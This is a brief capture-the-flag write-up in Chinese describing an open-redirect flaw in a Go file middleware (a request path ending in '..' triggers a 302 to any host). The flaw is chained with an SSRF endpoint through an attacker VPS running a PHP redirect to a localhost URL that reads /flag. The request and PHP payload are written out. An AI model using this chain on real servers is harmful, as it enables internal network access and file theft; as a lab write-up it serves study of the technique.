## this is a writeup


http.Dir("/dir").open()
可以打开文件 或者 目录，如果open函数的参数为. 或者 .. 返回对象也会被认为是一个目录

于是我们可以根据fileMidderware中的内容，传入
GET //www.com/.. HTTP/1.1

56行代码判断..为路径且不以/结尾，所以302 返回//www.com/../造成任意302

再通过vul控制器ssrf 配合 即可攻击url
虽然我们无法输入url参数，但302不限次数，先跳到自己的vps，在302到带参数的内网地址即可获取flag

index.php(vps)
```
<?php

header("Location: http://127.0.0.1/index.php?file=/flag");
?>
```php

请求http://challenge.ip:port//vps.ip/.. 即可（用burp，有些浏览器会自动删除..